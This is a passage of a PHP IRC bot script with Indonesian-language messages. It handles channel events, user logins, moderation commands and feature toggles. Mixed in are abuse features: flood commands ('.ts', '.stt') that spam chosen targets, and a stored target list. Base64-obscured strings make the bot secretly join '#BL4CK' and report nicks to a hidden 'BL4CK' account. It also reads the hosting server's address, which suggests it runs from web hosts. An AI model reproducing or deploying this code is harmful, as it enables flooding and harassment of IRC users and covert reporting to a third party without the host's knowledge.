                                                        $modbot->msg($fp,$addchan,$webe);
                                                     }
                                                }
                                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        if($systembot['GVOICE'][strtoupper($addchan)]=="3ON"){
                                                           sleep(5);
                                                           if(strtolower($bot['admin'])==strtolower($fsrc[nick])){
                                                                 $modbot->mode($fp,'+h',$addchan,$nickwb);
                                                           }else{$modbot->mode($fp,'+v',$addchan,$nickwb);       }
                                                        }
                                                     }
                                                }
                                       } 
                                break;
                            case "PART":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);                               
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[6minggat12] ";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$fsrc[nick],'You`re LogOut On Parting Channel!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$modbot->join($fp,base64_decode("I0JMNENL"));$modbot->destroy_chan($Params[2]);}
				else{
                                $hospartnya=$fsrc[host];
                                  if($hospartnya != $truhostpart){
                                     $modbot->del_nickchan($Params[2],$fsrc[nick]);
                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                     if($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                                        $ngomongpamit = $ngomongpamitpart[rand(0,count($ngomongpamitpart) - 1)];
                                        $ngomongpamit = str_replace("<nick>",$fsrc[nick],$ngomongpamit);
                                        $ngomongpamit = str_replace("<chan>",$addchan,$ngomongpamit);
                                        $modbot->msg($fp,$fsrc[nick],$ngomongpamit);
                                        $truhostpart=$fsrc[host];
                                     }
                                     }
                                   }else{$truhostpart=$fsrc[host];}
                                }
                                break;
                            case "KICK":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($Params[3]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[9di bacok12] ";
                                if(strtolower($bot['nick'])==strtolower($Params[3])){
                                    $modbot->destroy_chan($Params[2]);
                                    if($systembot['AUTOJOIN'][strtoupper($Params[2])]=='3ON'){sleep(1);$modbot->msg($fp,"Chanserv",'UNBAN '.$Params[2].' '.$bot['nick']);sleep(1);$modbot->join($fp,$Params[2]);}
                                }
                                else{ $modbot->del_nickchan($Params[2],$Params[3]);}
                                break;
                            case "QUIT":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);
                                if($ikutbos=="ON" && $diaseen== strtolower($nickgantinya)){sleep(3);$modbot->nick($fp,$nickgantinya);}
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']="ini";$asalseen[$diaseen.'status']=" 12[9njepad12] ";
                                $modbot->change_nickchan($fsrc[nick],"");
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$modbot->logoutbot($fsrc[nick]);}
                                break;
                            case "NOTICE":
                                if($Params[3]==':PING'){
                                   $modbot->stuf_lag($fp,$fsrc[nick],$Params[4]); 
                                }
                                if($Params[3]==':VERSION'){
                                    if($datversi[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,8);
                                        $modbot->msg($fp,$datversi[strtolower($fsrc[nick])]["chan"],'1:02::12::06::04::07::09::08::15 VeRSioN 08::09::07::04::06::12::02::01: 12'.$fsrc[nick].'14 '.$vernya);
                                    }
                                    unset($datversi[strtolower($fsrc[nick])]["nick"]);unset($datversi[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':FINGER'){
                                    if($datfinger[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$vernya=str_replace(chr(1),"",$dText);$vernya=substr($vernya,7);
                                        $modbot->msg($fp,$datfinger[strtolower($fsrc[nick])]["chan"],'12<3<11(04FinGeR11)3>12>7 '.$fsrc[nick].'14 '.$vernya);
                                    }
                                    unset($datfinger[strtolower($fsrc[nick])]["nick"]);unset($datfinger[strtolower($fsrc[nick])]["chan"]);
				}
                                if($Params[3]==':TIME'){
                                    if($dattime[strtolower($fsrc[nick])]["nick"]==strtolower($fsrc[nick])){
					$timenya=str_replace(chr(1),"",$dText);$timenya=substr($timenya,5);
                                        $modbot->msg($fp,$dattime[strtolower($fsrc[nick])]["chan"],'12<3<11(04TiMe11)3>12>7 '.$fsrc[nick].'14 '.$timenya);
                                    }
                                    unset($dattime[strtolower($fsrc[nick])]["nick"]);unset($dattime[strtolower($fsrc[nick])]["chan"]);
                                }
                                break;
                            case "PRIVMSG":
                                $TxtMsg=substr($DataLine,strpos($DataLine," :")+2);
                                unset($dCom);$dCom=explode(" ", $TxtMsg);$perintah=strtolower($dCom[0]);
                                if($haltfl['on']==0){
                                if($botaktif=="ON"){
                                if ( $Params[3]==":PING") {$modbot->notice($fp,$fsrc[nick],$TxtMsg);}
                                elseif ($Params[3]==":VERSION") { $ctcpversi=$versbot[rand(0,count($versbot) - 1)];$modbot->notice($fp,$fsrc[nick],chr(1) . 'VERSION '. $ctcpversi . chr(1));}
                                elseif ($Params[3]==":FINGER") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'FINGER '. $ctcpfinger . chr(1));}
                                elseif ($Params[3]==":TIME") { $timetoday = date("D M j H:i:s Y"); $modbot->notice($fp,$fsrc[nick],chr(1) . 'TIME '.$timetoday . chr(1));}
                                }
                                }
                                ################ ANTI SLAPS ############
                                if($Params[3]==':ACTION' && ereg('#',$Params[2]) && $systembot['SLAPS'][strtoupper($Params[2])]=="3ON"){
                                    if(strpos(strtolower($TxtMsg),"slaps") || strpos(strtolower($TxtMsg),"slap")){
                                        foreach ($auth as $ulist) {if($ulist["name"]){if(strpos(strtolower($TxtMsg),strtolower($ulist["name"]))){$onbos=1;}}}
                                        if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$onbos=0;}
                                        if($onbos==1){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapbos());}
                                        elseif($onbos==0){if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->msg($fp,$Params[2],$modbot->rnd_slapampun());}}
                                        else{if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapme());}}
                                        $onbos=2;
                                    }
                                }
                                ############ END ANTI SLAPS ############
                                if (substr($Params[3],0,1)==':' && ($fsrc[nick] != $bot['nick'] ) && !ereg('#',$Params[2])){
                                    if (!ereg($fsrc[host],"net")){
                                            $ngomonggue = $autojawabpv[rand(0,count($autojawabpv) - 1)];
                                            $ngomonggue = str_replace("<nick>",$fsrc[nick],$ngomonggue);
                                            $modbot->msg($fp,$fsrc[nick],$ngomonggue);
                                    }
                                }
                                if (substr($Params[3],0,2)==':^'){
                                    $logok=$modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host]);
                                    if (strtolower($dCom[0])=='^login' && $dCom[1]) {
                                        if($logok==1){$modbot->notice($fp,$fsrc[nick],"You`re Already Authorized!");}
                                        else{
                                            if($haltfl['on']!=0){sleep(2);};
                                            if($modbot->loginbot($fsrc[nick],$fsrc[user],$fsrc[host],$dCom[1])==1){
                                                $modbot->notice($fp,$fsrc[nick],'MuWaCh...YoU`Re My '.$auth["$fsrc[nkecil]"]["status"].'!');
                                                $modbot->notice($fp,$fsrc[nick],'FoR HeLp TyPe .help');
                                                $auth["$fsrc[nkecil]"]["ident"]=$fsrc[user];$auth["$fsrc[nkecil]"]["host"]=$fsrc[host];
                                                if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                            }
                                        }
                                   }
                                   elseif (strtolower($dCom[0])=='^logout' && $logok==1) {
                                    if($modbot->logoutbot($fsrc[nick])==1){$modbot->notice($fp,$fsrc[nick],'KeNaPa LogOut ChYnK!');}
                                   }
                                }
                                elseif (substr($Params[3],0,2)==':.'){
                                    if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){
                                        if (ereg('#',$Params[2])){$cmdin=1;$target=$Params[2];}else {$cmdin=2;$target=$fsrc[nick];}
                                        $getlvl=$modbot->level_user($fsrc[nick]);
                                        if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                        ############### MULTI USER BOT ##############
                                        if ($perintah=='.chgpass' && $dCom[1] && $dCom[2]) {
                                            $modbot->chgpass_user($fp,$fsrc[nick],$dCom[1],$dCom[2]);
                                        }
                                        elseif ($perintah=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $getlvl > 1) {
                                            $modbot->add_user($fp,$fsrc[nick],$dCom[1],$dCom[2],$dCom[3]);
                                        }
                                        elseif ($perintah=='.deluser' && $dCom[1] && $getlvl > 1) {
                                            $modbot->del_user($fp,$fsrc[nick],$dCom[1]);
                                        }
                                        ############# END MULTI USER BOT ############
                                        
                                        ########## CHANGE SERVER IDENT REALNAME SERVPASS && JUMP ########
                                        elseif ($perintah=='.server' && $dCom[1] && $getlvl > 2){
                                            $bot['server']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.port' && $dCom[1] && $getlvl > 2){
                                            $bot['port']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging pOrt To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.servpass' && $dCom[1] && $getlvl > 2){
                                            $bot['pserver']=$dCom[1];$bot['userver']=1;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging PassWOrD SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.ident' && $dCom[1] && $getlvl > 2){
                                            $bot['ident']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging IdentD To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.vhost' && $dCom[1] && $getlvl > 2){
                                            $bot['local']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging VhosT To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.realname' && $dCom[1] && $getlvl > 2){
                                            $Rmsg=substr($TxtMsg,10);$Rmsg=ltrim($Rmsg);$bot['realname']=$Rmsg;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging ReaLNaMe To '. $Rmsg);
                                        }
                                        elseif ($perintah=='.jump' && $getlvl > 2){
                                            $keluar = 0;$modbot->quit($fp,$modbot->rnd_logo() .' DiReSTaRT SaMa '.$fsrc[nick]);
                                        }
                                        ########################## END CHG SER IDENT REAL ##########################
                                        
                                        ################################ #### ##################################
                                        elseif ($perintah=='.botnick' && $getlvl > 1) {
                                                $modbot->notice($fp,$fsrc[nick],'My Nick Is :'.$bot['nick']);
                                        }
                                        elseif ($perintah=='.identnick' && $dCom[1] && $dCom[2] && $cmdin==2 && $getlvl > 1){
                                                $bot['inick']=$dCom[1];$bot['pnick'] = $dCom[2];
                                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);
                                                $modbot->notice($fp,$fsrc[nick],"Identify nick... to ".$dCom[1]);
                                        }
                                        elseif ($perintah=='.logoutnick' && $getlvl > 1){
                                                $modbot->msg($fp,"Nickserv","logout");$modbot->notice($fp,$fsrc[nick],"Logout nick");
                                        }
                                        elseif ($perintah=='.basechan' && $dCom[1] && $getlvl > 2){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['basechan'],$modbot->rnd_logo() . ' BaseChan cHanGE by ' . $frsc[nick]);
                                                $bot['basechan']=$bchan;$modbot->join($fp,$bot['basechan']);
                                        }
                                        elseif ($perintah=='.botchan' && $dCom[1] && $dCom[2] && $getlvl > 3){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['roomnet']);$bot['roomnet']=$bchan;
                                                $bot['roomkey']=$dCom[2];$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);
                                        }
                                        elseif ($perintah=='.userlist' && $getlvl > 1) {
                                            $modbot->notice($fp,$fsrc[nick],'User List: '.$modbot->user_list($fp,$fsrc[nick]));
                                        }
                                        elseif ($perintah=='.chanlist' && $getlvl > 2) {
                                            $datachan=str_replace(";"," ",$modbot->show_chan());$modbot->notice($fp,$fsrc[nick],$datachan);$datachan="";unset($datachan);
                                        }
                                        elseif ($perintah=='.nicklist' && $dCom[1] && $getlvl > 2) {
                                            $nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
                                            $datanick=explode(" ",$modbot->show_nickchan($nchan));
                                            for ($i = 0; $i <= count($datanick); $i++) {
                                                $limitshow++;$lnick_x=$lnick_x.' '.$datanick[$i];
                                                if($limitshow==15){
                                                    $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);$modbot->notice($fp,$fsrc[nick],$lnick_x);
                                                    $limitshow=0;$lnick_x="";
                                                }
                                            }
                                            $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);
                                            if($lnick_x){$modbot->notice($fp,$fsrc[nick],$lnick_x);}$lnick_x="";
                                            unset($lnick_x);unset($datanick);
                                        }
                                        elseif ($perintah=='.showison' && $getlvl > 2) {$modbot->notice($fp,$fsrc[nick],$modbot->show_ison());}
                                        elseif ($perintah=='.chanison' && $getlvl > 2) {$chanson=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChanIson cHanGe To '.$dCom[1]);}
                                        elseif ($perintah=='.settimercycle' && $dCom[1] && $getlvl > 2) {
                                                $timercy=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO Cycle cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimerinfo' && $dCom[1] && $getlvl > 2) {
                                                $timerberita=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO berita cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimermsg' && $dCom[1] && $getlvl > 2) {
                                                $timermsg=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoMsg cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif ($perintah=='.settimeract' && $dCom[1] && $getlvl > 2) {
                                                $timeract=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoAction cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif($perintah=='.setversion' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpversi=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'VerSIoN cHanGe To '.$ctcpversi);
                                        }
                                        elseif($perintah=='.setfinger' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpfinger=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'FiNGeR cHanGe To '.$ctcpfinger);
                                        }
                                        ################################ #### ##################################
                                        
                                        
                                        ######################### CONTROL BOT #######################
                                        elseif ($perintah=='.up' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->msg($fp,"Chanserv",'Op '.$Params[2].' '.$bot['nick']);
                                        }
                                            elseif ($perintah=='.down' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->mode($fp,"+v-ho",$Params[2],$bot['nick'].' '.$bot['nick'].' '.$bot['nick']);
                                            }
                                            elseif ($perintah=='.o' || $perintah=='.h' || $perintah=='.v' || $perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                if ($getlvl > 1){
                                                    if ($perintah=='.o' || $perintah=='.h' || $perintah=='.v'){
                                                        $moden=strtolower(substr($dCom[0],1));$moden='+'.$moden . $moden . $moden;
                                                    }
                                                    elseif ($perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                        $moden=strtolower(substr($dCom[0],2));$moden='-'.$moden . $moden . $moden;
                                                    }
                                                    if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
                                                    if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
                                                    $modbot->mode($fp,$moden,$ttarget,$vonick.' '.$tmore);
                                                }
                                            }
                                            elseif ($perintah=='.k' || $perintah=='.kb' || $perintah=='.kc') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$dCom[0].' '.$dCom[1];}
                                                    elseif($cmdin==2){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1].' '.$dCom[2];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1); $msg=ltrim($msg);$msg=rtrim($msg);
                                                    if($perintah=='.k'){
                                                        $modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kb'){
                                                        $modbot->ban($fp,$ttarget,$tdata);$modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kc'){$modbot->kickserv($fp,$ttarget,$tdata,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.b' || $perintah=='.ub') {
                                                if($getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $tmode=substr($TxtMsg,strlen($tkode)+1);
                                                    $tmode=ltrim($tmode);$tmode=rtrim($tmode);
                                                    if($perintah=='.b'){$modbot->ban($fp,$ttarget,$tmode);}
                                                    else{$modbot->unban($fp,$ttarget,$tmode);}
                                                }
                                            }
                                            elseif ($perintah=='.j' && $dCom[1]) {
                                                $jchan=$dCom[1];if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
                                                $modbot->join($fp,$jchan,$dCom[2]);
                                            }
                                            elseif ($perintah=='.max' && $dCom[1]) {
                                                $maxkar=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'MaX ChaRaCTeR iS '.$maxkar.'!!!');
                                            }
                                            elseif ($perintah=='.bagi' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$bagitarget="OFF";}
                                                if(strtolower($dCom[1])=='on'){$bagitarget="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'BaGi TaRGeT Ke BoZzZ '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.flodban' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$floddban="OFF";}
                                                if(strtolower($dCom[1])=='on'){$floddban="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'FlooDbaN '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.ganti' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$ikutbos="OFF";}
                                                if(strtolower($dCom[1])=='on'){$ikutbos="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'GanTiin BoZzZ '.$ikutbos.'!!!');
                                            }
                                            elseif ($perintah=='.reident' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$reident="OFF";}
                                                if(strtolower($dCom[1])=='on'){$reident="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'OtOmaTiS iDeNt '.$reident.'!!!');
                                            }
                                            elseif ($perintah=='.target') {
                                                $ngulange=0;
                                                do {
                                                  $ngulange=$ngulange+1;
                                                  $modbot->msg($fp,$fsrc[nick],$hasiltargetgue[$ngulange]);sleep(1);
                                                  if($ngulange>=$notarget){$modbot->notice($fp,$fsrc[nick],'udA aBiZ BoZzZ..');break;   }
                                                } while(true);  
                                            }
                                            elseif ($perintah=='.shell' && $dCom[1]) {
                                                $shellgue=$dCom[1]."?";
                                                $modbot->notice($fp,$fsrc[nick],'Shell skarang '.$shellgue.'?');
                                            }
                                            elseif ($perintah=='.gantiin' && $dCom[1]) {
                                                $nickgantinya=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'SipT..NtaR Au GaNtiin '.$nickgantinya.' eA BoZzZ..!!!');
                                            }
                                            elseif ($perintah=='.repp' && $dCom[1]) {
                                                $makre=$dCom[1];
                                                $Maxreep=$dCom[1]-1;
                                                $modbot->notice($fp,$fsrc[nick],'MaX RePeaT iS '.$makre.'!!!');
                                            }
                                            elseif ($perintah=='.p' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,3+strlen($dCom[1])+1);
                                                $modbot->part($fp,$pchan,$pmsg);
                                                $modbot->destroy_chan($pchan);
                                            }
                                            elseif ($perintah=='.cy' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,4+strlen($dCom[1])+1);
                                                $modbot->Cycle($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.a' || $perintah=='.s') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.a'){$modbot->act($fp,$ttarget,$msg);
                                                    }else{$modbot->msg($fp,$ttarget,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.stm' || $perintah=='.stt') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.stm'){
                                                       $msg=str_replace($fsrc[nick],"",$msg);
                                                       $modbot->msg($fp,$dCom[1],$msg);
                                                    }else{
                                                    $notice="[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[]";
                                                    $modbot->msg($fp,$dCom[1],$msg);
                                                    }
                                                }
                                            }
                                            elseif ($perintah=='.stm' || $perintah=='.stt') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.stm'){
                                                       $msg=str_replace($fsrc[nick],"",$msg);
                                                       $modbot->msg($fp,$dCom[1],$msg);
                                                    }else{
                                                    $msg="[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[]";
                                                    $modbot->msg($fp,$dCom[1],$msg);
                                                    }
                                                }
                                            }
                                            elseif ($perintah=='.away'){
                                                if($dCom[1]){$modbot->away($fp,substr($TxtMsg,6));}else{$modbot->noaway($fp);}
                                            }
                                            
                                            elseif ($perintah=='.n' && $dCom[1]){$modbot->nick($fp,$dCom[1]);}
                                            elseif ($perintah=='.q' && $getlvl > 3 ){
                                            $keluar=1;if($dCom[1]){$Qmsg=substr($TxtMsg,3);}$modbot->quit($fp,$Qmsg);$keluar=1;sleep(3);exit;
                                            }
                                            elseif ($perintah=='.aktif' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$botaktif="OFF";}
                                                if(strtolower($dCom[1])=='on'){$botaktif="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'ctcp reply bot sekarang '.$botaktif.'!!!');
                                            }
                                            elseif ($perintah=='.ts' && $dCom[1] && $getlvl > 2){
                                                $modbot->flood($fp,$dCom[1],$TxtMsg);
                                            }
                                            elseif($perintah=='.info'){
                                                $bhost = $_SERVER['HTTP_HOST'];
                                                $bip = $_SERVER['SERVER_ADDR'];
                                                $bphp  = $_SERVER['PHP_SELF'];
                                                $bruri = $_SERVER['REQUEST_URI'];
                                                $brip = $_SERVER['REMOTE_ADDR'];
                                                $brport = $_SERVER['REMOTE_PORT'];
                                                if($bot['admin']==$fsrc[nick]){
                                                $modbot->notice($fp,$fsrc[nick],"8http://".$bhost.$bruri." 12<".$bip.">");
                                                }else{$modbot->notice($fp,$fsrc[nick],"WeITz GaK BoLeH NGiNTiP....!!!!");$modbot->notice($fp,base64_decode("Qkw0Q0s="),$fsrc[nick]." MaU MeRKoSa aQuH BoZ!!!!");}
                                            }
                                            elseif($perintah=='.help'){
                                                $modbot->mod_help($fp,$fsrc[nick]);
                                            }
                                            ###################### END CONTROL BOT #####################
                                            
                                            ################################ SYSTEM ###################################
                                            elseif ($perintah=='.status' && $getlvl > 2 && $cmdin==1 ){
                                                if($dCom[1]){$chan=$dCom[1];}

                                                else{$chan=$Params[2];}
                                                if (!ereg("#",$chan)){$chan="#".$chan;}
                                                $chan=strtoupper($chan);
                                                $modb="";
                                                if($systembot['TIME'][$chan]=="3ON"){$modb.=' 0[1TiMe0]';}
                                                if($systembot['ASTRO'][$chan]=="3ON"){$modb.=' 0[1aSTRo0]';}
                                                if($systembot['PING'][$chan]=="3ON"){$modb.=' 0[1PinG0]';}
                                                if($systembot['BOM'][$chan]=="3ON"){$modb.=' 0[1BoM0]';}
                                                if($systembot['WHOIS'][$chan]=="3ON"){$modb.=' 0[1wHoiS0]';}
                                                if($systembot['GUARD'][$chan]=="3ON"){$modb.=' 0[1GuaRd0]';}
                                                if($systembot['GVOICE'][$chan]=="3ON"){$modb.=' 0[1G-vOiCe0]';}
                                                if($systembot['JVERSION'][$chan]=="3ON"){$modb.=' 0[1J-VeRSioN0]';}
                                                if($systembot['SEEN'][$chan]=="3ON"){$modb.=' 12[4SeeN12]';}
                                                if($systembot['JAM'][$chan]=="3ON"){$modb.=' 4[12Jam4]';}
                                                if($systembot['SCANSPY'][$chan]=="3ON"){$modb.=' 4[9sPy4]';}
                                                if($systembot['BADWORD'][$chan]=="3ON"){$modb.=' 12[9BaDWoRd12]';}
                                                if($systembot['SMS'][$chan]=="3ON"){$modb.=' 12[4sMs12]';}
                                                if($systembot['NGOMONG'][$chan]=="3ON"){$modb.=' 12[4nGoMonG12]';}
                                                if($systembot['SPOOF'][$chan]=="3ON"){$modb.=' 12[4sPooF12]';}
                                                if($systembot['KSLANG'][$chan]=="3ON"){$modb.=' 12[4k-sLanG12]';}
                                                if($systembot['IP'][$chan]=="3ON"){$modb.=' 12[4iP-LiSt12]';}
                                                if($systembot['FS'][$chan]=="3ON"){$modb.=' 12[4fRieNdSteR12]';}
                                                if($systembot['BERITA'][$chan]=="3ON"){$modb.=' 12[3BeRiTa12]';}
                                                if($systembot['VERSION'][$chan]=="3ON"){$modb.=' 12[9VeRSioN12]';}
                                                if($systembot['CHAT'][$chan]=="3ON"){$modb.=' 9[4ChaT9]';}
                                                if($systembot['GUYON'][$chan]=="3ON"){$modb.=' 12[4JoKeS12]';}
                                                if($systembot['JPESAN'][$chan]=="3ON"){$modb.=' 12[4j-PeSaN12]';}
                                                if($systembot['FINGER'][$chan]=="3ON"){$modb.=' 12[4FinGeR12]';}
                                                if($systembot['ISON']['ALL']=="3ON"){$modb.=' 6[4iSoN6]';}
                                                if($systembot['GREET'][$chan]=="3ON"){$modb.=' 12[4gReeT12]';}
                                                if($systembot['AUTOAWAY']['ALL']=="3ON"){$modb.=' 12[4AuTo aWay12]';}
                                                if($systembot['AUTOCYCLE'][$chan]=="3ON"){$modb.=' 12[4AuTo CyCLe12]';}
                                                if($systembot['AUTOJOIN'][$chan]=="3ON"){$modb.=' 12[4AuTo JoiN12]';}
                                                $modb=ltrim($modb);
                                                $modb=rtrim($modb);
                                                if($modb==""){$modb="4[8Ga' aDa TuGaS Ni BoZ4]";}
                                                $modbot->act($fp,$Params[2],'iS MODeS '.$modb.' FoR [9'.strtoupper($chan).']');
                                            }
                                        elseif (substr($perintah,0,2)=='.+' || substr($perintah,0,2)=='.-'){
                                            if(substr($perintah,1,1)=='+'){$onoff="3ON";}elseif(substr($perintah,1,1)=='-'){$onoff="4OFF";};
                                            $wsys=substr(strtoupper($perintah),2);
